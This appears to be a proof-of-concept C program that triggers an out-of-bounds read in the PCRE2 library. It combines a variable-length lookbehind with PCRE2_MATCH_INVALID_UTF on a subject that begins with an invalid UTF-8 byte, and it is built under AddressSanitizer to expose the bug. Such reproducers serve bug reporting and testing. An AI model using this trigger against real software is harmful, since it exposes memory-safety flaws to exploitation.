/* PoC: variable-length lookbehind reverse scan past check_subject with
 * PCRE2_MATCH_INVALID_UTF on a subject whose invalid UTF-8 prefix was skipped.
 *
 * Build:  gcc -fsanitize=address -I<build>/interface pocs/residual.c <build>/libpcre2-8.a -o residual
 */

#include <stdio.h>
#include <stdlib.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

int main(void)
{
  int errorcode;
  PCRE2_SIZE erroroffset;
  pcre2_code *re;
  pcre2_match_data *match_data;
  PCRE2_UCHAR *subject;
  int rc;

  re = pcre2_compile((PCRE2_SPTR)"(?<=a{1,2})X", PCRE2_ZERO_TERMINATED,
    PCRE2_UTF | PCRE2_MATCH_INVALID_UTF, &errorcode, &erroroffset, NULL);
  if (re == NULL)
    {
    PCRE2_UCHAR message[256];
    pcre2_get_error_message(errorcode, message, sizeof(message));
    printf("compile failed at offset %lu: %s\n",
      (unsigned long)erroroffset, (char *)message);
    return 1;
    }

  match_data = pcre2_match_data_create_from_pattern(re, NULL);

  /* An isolated trailing byte at the start of the subject is an invalid UTF-8
  prefix; with PCRE2_MATCH_INVALID_UTF matching starts after it. The variable
  lookbehind then walks back over it, below the start of the subject. */

  subject = (PCRE2_UCHAR *)malloc(2);
  if (subject == NULL) return 1;
  subject[0] = 0x80;
  subject[1] = 'X';

  rc = pcre2_match(re, subject, 2, 0, 0, match_data, NULL);
  printf("match rc = %d\n", rc);

  free(subject);
  pcre2_match_data_free(match_data);
  pcre2_code_free(re);
  return 0;
}
